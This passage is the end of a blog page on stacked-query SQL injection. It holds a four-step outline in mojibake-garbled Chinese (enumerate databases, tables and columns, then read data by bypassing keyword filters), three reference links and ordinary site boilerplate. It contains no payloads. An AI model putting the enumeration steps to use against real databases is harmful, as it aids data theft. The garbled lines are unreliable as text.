<p>ğŸ’åˆ—å‡ºæ•°æ®åº“å</p>

<p>ğŸ’åˆ—å‡ºè¡¨å</p>

<p>ğŸ’åˆ—å‡ºåˆ—å</p>

<p>ğŸ’æƒ³åŠæ³•è¯»æ•°æ®ï¼Œè¿™é‡Œçš„æ“ä½œæ˜¯å…³é”®è¯ç»•è¿‡</p>

<h1 id="refer">Refer</h1>

<p><a href="www.wuliao.com">https://xz.aliyun.com/t/5505</a></p>

<p><a href="www.shibushisha.com">https://www.zhaoj.in/read-5873.html</a></p>

<p><a href="www.hahahaha.com">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>

  <!-- Introducing the share module -->
  
  <div class="social-share-wrapper">
    <div class="social-share"></div>
  </div>


<!-- share.js -->
<script src="/assets/js/social-share.min.js"></script>
<script>
  socialShare('.social-share', {
    sites: [
      
        'weibo'
        ,
        
      
        'qq'
        ,
        
      
        'wechat'
        
      
    ],
    wechatQrcodeTitle: "Share to WeChat circle",
    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
  });
</script>

</div>

<!-- Bottom anchor -->
<a id="htmldown" name="htmldown"></a>
<!-- Introducing the comment module -->



    <section class="post-footer-item comment">
      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
    </section>

    <!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
    <script type="text/javascript">
       (function(d, s) {
           var j, e = d.getElementsByTagName(s)[0];

           if (typeof LivereTower === 'function') { return; }

           j = d.createElement(s);
           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
           j.async = true;

           e.parentNode.insertBefore(j, e);
       })(document, 'script');
    </script>
    <noscript>Please activate JavaScript for normal use.</noscript>
    <!-- City version code installation has been completed -->





<!-- Introducing the goto module -->
<div class="bounceInRight animated go">
  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
    <div class="box" style="font-family:'ffad_matroregular';">
        Top
    </div>
  </a>
  <a title="At the bottomlivereè¯„è®ºå“¦" class="gotobottom" href="#htmldown" target="_self">
    <div class="box" style="font-family:'ffad_matroregular';">
        Foot
    </div>
  </a>
</div>

<!-- Introduce the module at the bottom of the page -->

<footer id="bottom">
  <script src="/assets/css/bootstrap.min.css"></script>

<!-- START BREADCRUMBS -->
<nav aria-label="breadcrumb">

  <ol class="breadcrumb">
  
  
  
  </ol>
</nav>

<!-- END BREADCRUMBS -->


<div id="breadcrumbs">

<a href="/">Home</a>

  
    / <a href="/blog/">Blog</a>
  

  
    / Sqli stacked queries
  

</div>
<style>
#breadcrumbs {margin-left: 0

      font-size: 10rem;
      padding: 0.75rem 1rem;
      margin-bottom: 1rem;
      list-style: none;
      background-color: # #fcfcfc;
      border-radius: 0.25rem;

      content: "";
      display: table;
      clear: both;

      float: left;

      display: inline-block;
      padding-right: 0.5rem;
      padding-left: 0.5rem;
      color: #818a91;
      content: "/";

      text-decoration: underline;

      text-decoration: none;

}
</style>

  <br>
  <span>sueisok Â©
  
  
  2020
  <br>
  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
</footer>
<link rel="stylesheet" href="/assets/css/style.css">
<link rel="stylesheet" href="/assets/css/media.css">
<link rel="stylesheet" href="/assets/css/animate.min.css">
<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
<link rel="stylesheet" href="/assets/css/github-markdown.css">
<!-- SNS-icon -->
<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
<!-- share.css -->
<link rel="stylesheet" href="/assets/css/share.min.css">
<!-- font -->
<link rel="stylesheet" href="/assets/css/font.css">
<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->



<!-- Quote the animation effect of wow.js -->
<script src="/assets/js/wow.js"></script>
<script>
    var wow = new WOW({
        boxClass: 'wow',
        animateClass: 'animated',
        // offset: 600,
        mobile: true,
        live: true
    });
    wow.init();
</script>
<!-- Page refreshes back to top -->
<script>
    window.onbeforeunload = function(){
        //The page automatically returns to the top after refreshing
        document.documentElement.scrollTop = 0;  //ieä¸‹
        document.body.scrollTop = 0;  //éie
    }
</script>

<!-- preloder script -->
<!-- end -->
<script>
//open external links in a new window
function external_new_window() {
    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
    var b = c[a];
    b.getAttribute("href") && b.hostname !== location.hostname
    }
}
//open PDF links in a new window
function pdf_new_window ()
{
    if (!document.getElementsByTagName) return false;
    var links = document.getElementsByTagName("a");
    for (var eleLink=0; eleLink < links.length; eleLink ++) {
    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
        links[eleLink].onclick =
        function() {
            window.open(this.href);
            return false;
        }
    }
    }
}
pdf_new_window()
external_new_window();
</script>

<style>
.videoWrapper {
    position: relative;
    padding-bottom: 56.333%;
    height: 0;
    background: black;
}
.videoWrapper iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 0;
}
</style>

<script>
function get_youtube_id(url) {
    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
    return (url.match(p)) ? RegExp.$1 : false;
}
function vimeo_embed(url,el) {
    var id = false;
    $.ajax({
      url: 'https://vimeo.com/api/oembed.json?url='+url,
      async: true,
      success: function(response) {
        if(response.video_id) {
          id = response.video_id;
          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
          if(autoplay==1) theInnerHTML += '&autoplay=1';
          if(loop==1) theInnerHTML += '&loop=1';
          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
          el.innerHTML = theInnerHTML;
        }
      }
    });
}
function video_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        //check if this is an external url (that starts with https:// or http://
        if (p[i].innerHTML.indexOf("http://") == 0 ||
            p[i].innerHTML.indexOf("https://") == 0) {
            var youtube_id = get_youtube_id(p[i].innerHTML);
            if(youtube_id) {
                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
                if(autoplay==1) theInnerHTML += '&autoplay=1';
                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
                p[i].innerHTML = theInnerHTML;
            }
            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
                //ask vimeo for the id and place the embed
                vimeo_embed(p[i].innerHTML,p[i]);
            }
        }
    }
}
video_embed();

function mp3_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
            var str = p[i].innerHTML.split('?');
            if(str.length == 1) str[1] = '';
            var str1 = str[1];
            str1 = str1.replace('&','').replace('&','');
            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
            str1 = str1.replace('loop=1','').replace('loop=0','');
            str1 = str1.replace('controls=0','').replace('controls=1','');

            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
                var newInnerHTML = '<audio';
                if(autoplay==1) newInnerHTML += ' autoplay';
                if(loop==1) newInnerHTML += ' loop';
                if(controls==1) newInnerHTML += ' controls';
                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
                p[i].innerHTML = newInnerHTML;
            }
        }
    }
}
mp3_embed();
</script>


<!-- preloder script -->
<script>
    var preloader = document.getElementById("loader");
    function loaderFunc(){
      preloader.style.display = 'none';
    };
</script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<!-- end -->

</body>
</html>
